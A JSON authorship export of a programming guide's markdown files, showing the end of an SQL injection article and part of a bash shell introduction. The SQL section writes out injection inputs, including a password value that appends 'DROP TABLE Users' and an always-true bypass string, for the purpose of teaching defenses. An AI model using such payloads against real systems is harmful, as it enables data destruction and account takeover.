          "gitId": "-"
        },
        "content": "SELECT * FROM Users"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "This will return all the rows from the `Users` table in the database, regardless of username or password entered. "
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "The above technique of injecting malicious SQL code via user input is called SQL injection. If used in user authentication, the attacker is able to gain access to anyone\u0027s account. Moreover, this attacker can also modify sensitive information if the account owner has the privilege (e.g. a lecturer who can modify students\u0027 marks)."
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "**In addition to adding extra parameters to compromise the authentication, a malicious user may even add custom queries to view, modify the records in database, or even delete the whole database.**"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "An SQL query ends with a semicolon \";\". In the previous section the malicious user terminates one parameter by single quote \"\u0027\", and add more parameters behind it. Now, he can also terminate the query by semicolon, and adds another query at the back:"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "```sql"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "Username: foo"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "Password: bar’; DROP TABLE Users;"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "```sql"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "SELECT * FROM Users WHERE Username \u003d ‘foo’ AND Password \u003d ‘bar’; "
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "DROP TABLE Users;"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "When the database executes these two queries, it will delete all user information. Then other users cannot access this website. In addition to the `DROP` query, the attacker may also inject `SELECT` and `INSERT` queries, which can either read sensitive data from database or add data to it. "
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "## Why is it Important to Prevent SQL Injection?"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "1. **It is the most common type of attack.** According to [Open Web Application Security Project (OWASP) report](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf), the injection attack is always the annual top 1 application security risk from 2013 to 2017. In addition, [Statistics from Akamai](https://www.akamai.com/uk/en/resources/our-thinking/state-of-the-internet-report/web-attack-visualization.jsp) shows that in one week, over 80% of attacks are SQL injection."
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "1. **It can have serious consequences.** SQL injection can cause the loss of large amount of money. Based on the [Global Threat Intelligence Report](https://www.helpnetsecurity.com/2014/03/28/analysis-of-three-billion-attacks-reveals-sql-injections-cost-196000/), even a small SQL injection attack may cause hundreds of thousands dollars lost. "
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "Furthermore, information disclosure is another serious consequence. [An SQL injection attack on the toymaker company, VTech](https://coar.risc.anl.gov/consequences-of-sql-injection-attacks/), caused millions of parents\u0027 and children\u0027s profiles to be stolen. "
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "Thus, we need to pay attention to prevent this attack in our code."
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "1. **It is easy to prevent.** Referring to the section below, you do not need to put too many efforts on preventing from SQL injection. As it can prevent such a common attack, why not do it now?"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "## Preventing SQL Injection"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "There are a couple of ways to protect your website against SQL injection attacks. The two most common ways are:"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "1. Prepared Statements using Parameterized Queries"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "1. Whitelist Input Validation"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "The sections below explain the two options in more detail."
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Solution 1: Prepared Statements Using Parameterized Queries"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "By defining all the SQL code first and passing in the parameters afterwards, you can make the database distinguish the difference between code and data. It would treat the values entered by the user as a parameter, and would not allow it to alter the query being executed. The way to achieve this varies by language, but it is easy to implement and effective."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "For example, instead of writing this in Java:"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "String query \u003d \"SELECT * FROM Users WHERE Username \u003d \" + input_username +\"’ "
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "                AND Password \u003d ‘\" + input_password + \"’\";"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "Statement statement \u003d connection.createStatement();"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "ResultSet results \u003d statement.executeQuery( query );"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "You can prepare the statement like this:"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": " String query \u003d \"SELECT * FROM Users WHERE Username \u003d ? "
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "                AND Password \u003d ? \";"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": " PreparedStatement pstmt \u003d connection.prepareStatement( query );"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": " pstmt.setString( 1, input_username ); "
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": " pstmt.setString( 2, input_password );"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": " ResultSet results \u003d pstmt.executeQuery( );"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "The `?` in the query string is a placeholder for a string value. In the example, the first `?` is substituted with the value of `input_username` using the call `pstmt.setString(1, input_username)`. If the earlier attack was attempted, The query being submitted to the database will look like this:"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "```sql"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "SELECT * FROM Users WHERE Username \u003d \u0027foo\u0027 AND Password \u003d \u0027bar\u0027 OR ‘’\u003d’’"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "However, since it is treated as a value to be used, the database will not allow it to modify the query, and it would not be able to affect the structure of the SQL statement. As such, the query will check the database for entries where:"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "Username \u003d foo"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "AND "
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "Password \u003d bar OR ‘’\u003d’’"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "As such, the query is safe from SQL code being injected by users."
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "### Solution 2: Whitelist Input Validation"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "By applying a whitelist to the values a user is allowed to use, you can remove undesired symbols in the query being passed to the database "
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "(e.g. whitelisting only alphanumeric characters for a username). This ensures that attackers won\u0027t be allowed to enter special characters "
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "which may have unwanted effects when executed. (e.g. special characters in SQL such as `\u0027`, `@`, `^` and `_`)"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "References:"
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://www.owasp.org/index.php/SQL_Injection"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "(Basic description of SQL Injection attack taken from here)"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "1. http://projects.webappsec.org/f/WASC-TC-v2_0.pdf (page 105-110)"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": "(Description of the two types of SQL injection attack taken from here)"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "Additional Reading Resources:"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "1. https://www.sqlinjection.net/"
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "(Good starting point for diving deeper into SQL injection)"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)"
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "(How to test your website for SQL injection attacks)"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "(Parameterized query examples for some common languages)"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet"
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "(A list of possible preventions, which contains even more ways to protect your site from SQL injection attacks)."
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "1. https://guides.rubyonrails.org/security.html#sql-injection"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": "(Discussion of how SQL injection attacks work, some possible scenarios of such attacks, and possible preventive measures using Ruby on Rails)"
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://www.owasp.org/index.php/Blind_SQL_Injection"
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "(Discussion about a type of SQL injection attack, when only generic messages are displayed by the website)"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://cwe.mitre.org/data/definitions/89.html"
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": "(Comprehensive coverage of the aspects of SQL injection)"
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": "Additional Resources:"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://github.com/sqlmapproject/sqlmap"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": "(Penetration testing tool that detects and exploits SQL injection flaws)"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": "1. https://find-sec-bugs.github.io/"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "(Plugin to detect security vulnerabilities in Java web applications, including SQL injection)"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 2,
      "jamessspanggg": 2,
      "iskandarzulkarnaien": 11,
      "-": 227
    }
  },
  {
    "path": "contents/shells/bash.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to bash shell"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# Introduction to Linux Bash Shell "
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Wang Junming](https://github.com/junming403)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Rahul Rajesh](https://github.com/rrtheonlyone), [Ong Shu Peng](https://github.com/ongspxm), [Jeremy Choo](https://www.github.com/ChooJeremy), [Tan Zhen Yong"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": "](https://github.com/Xenonym)"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What is the shell?‎](#what-is-the-shell)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Bash scripts‎](#bash-scripts)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Combining of scripts via stream redirection‎](#combining-of-scripts-via-stream-redirection)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why use the shell?‎](#why-use-the-shell)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to get started?‎](#how-to-get-started)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is the Shell?"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "In general, a computer can be divided into 3 abstraction layers: hardware, kernel and applications. As users, we cannot control the hardware directly. Instructions have to be given through the kernel as the kernel is the one that controls the hardware."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"https://cdn-images-1.medium.com/max/1200/1*zEv6mAa2wzHnz4a5uWW4gw.png\" alt\u003d\"shell-kernel\" style\u003d\"width:400px;\"/\u003e"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "\u003csub\u003esource of image: [What (really) happens when you type ls -l in the shell](https://medium.com/meatandmachines/what-really-happens-when-you-type-ls-l-in-the-shell-a8914950fd73)\u003c/sub\u003e"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "The **shell** is the interface through which we pass instructions to the kernel. These instructions will then be executed through the hardware. In this article, we will look specifically into the **Linux bash shell**."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "[**bash**](https://www.gnu.org/software/bash/manual/html_node/) stands for **Bourne Again SHell**, an enhanced version of the original Unix Shell program. It has become the standard shell of various linux distributions. "
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"https://www.howtogeek.com/wp-content/uploads/2017/03/ximg_58c0939c2d487.png.pagespeed.gp+jp+jw+pj+ws+js+rj+rp+rw+ri+cp+md.ic.5lDzHl2vQG.png\" alt\u003d\"shell-kernel\" style\u003d\"width:600px;\"/\u003e"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "\u003csub\u003esource of image: [The Best Keyboard Shortcuts for Bash](https://www.howtogeek.com/howto/ubuntu/keyboard-shortcuts-for-bash-command-shell-for-ubuntu-debian-suse-redhat-linux-etc/)\u003c/sub\u003e"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "Users interact with the bash shell using various _commands_. A command is an instruction that is used to execute a specific function. The functions that a command is able to execute range from file/directory manipulation, process management to even networking!  You can also combine different commands to carry out complex operations."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "One of the most widely used command is `ls`, which lists out all the files under the current directory. Here is a video demonstration of the `ls` command in action:"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca href\u003d\"https://asciinema.org/a/06V6C9mg1lIAnJkzrsweojJUP\" target\u003d\"_blank\"\u003e\u003cimg src\u003d\"https://asciinema.org/a/06V6C9mg1lIAnJkzrsweojJUP.svg\" alt\u003d\"ls\" style\u003d\"width:500px;height:320px;\"/\u003e\u003c/a\u003e"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Bash Scripts"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "Bash supports a powerful language for writing scripts, usually referred to as **bash scripts**."
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "Bash scripts are able to carry out a range of operations by executing different commands. Let us consider an example: suppose you want to check if a given file exists. The following script will be able to do that; you input the filename and it will tell you the answer."
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "#!/bin/bash"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "echo -e \"Please input a filename, I will check if the file exists.\\n\""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "# waiting for user input."
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "read -p \"Input a filename : \" filename"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "# check if file exists."
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "test ! -e $filename \u0026\u0026 echo \"The file \u0027$filename\u0027 DO NOT EXIST\" \u0026\u0026 exit 0"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "test -f $filename \u0026\u0026 filetype\u003d\"regular file\""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "test -d $filename \u0026\u0026 filetype\u003d\"directory\""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "# output result."
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "echo \"The file: $filename is a $filetype\""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "Here is an video demonstration of running the script."
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca href\u003d\"https://asciinema.org/a/gGqI8rPSGTRM7Ndot7B6aLNEF\" target\u003d\"_blank\"\u003e\u003cimg src\u003d\"https://asciinema.org/a/gGqI8rPSGTRM7Ndot7B6aLNEF.svg\" alt\u003d\"check-file\" style\u003d\"width:500px;height:320px;\"/\u003e\u003c/a\u003e"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "The above bash script is still just a collection of bash commands; this means you can get the same result by typing those commands one at a time. However, the true advantage of using a bash script is due to its support for `conditionals`, `loops` and `functions`."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "The following is an example of a bash script that make use of conditionals and loops. Suppose you want to let the user input a directory name, check if it exists, and then output the write permission for all files inside that directory."
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "#!bin/bash"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "# read user input and check if directory exists."
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "read -p \"Please enter a directory name: \" dir"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "if [ \"$dir\" \u003d\u003d \"\" -o ! -d \"$dir\" ]; then"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "  echo \"The $dir is NOT exist in your system\""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "  exit 1"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "fi"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "# output permissions for each of the file under the directory."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "filelist\u003d$(ls $dir)"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "for filename in $filelist"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "do "
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "  perm\u003d\"readable\""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "  test -w \"$dir/$filename\" \u0026\u0026 perm\u003d\"$perm writable\""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "  echo \"The file $dir/$filename \u0027s permission is $perm\" "
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "done"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "Here is an video demonstration of the script in action."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
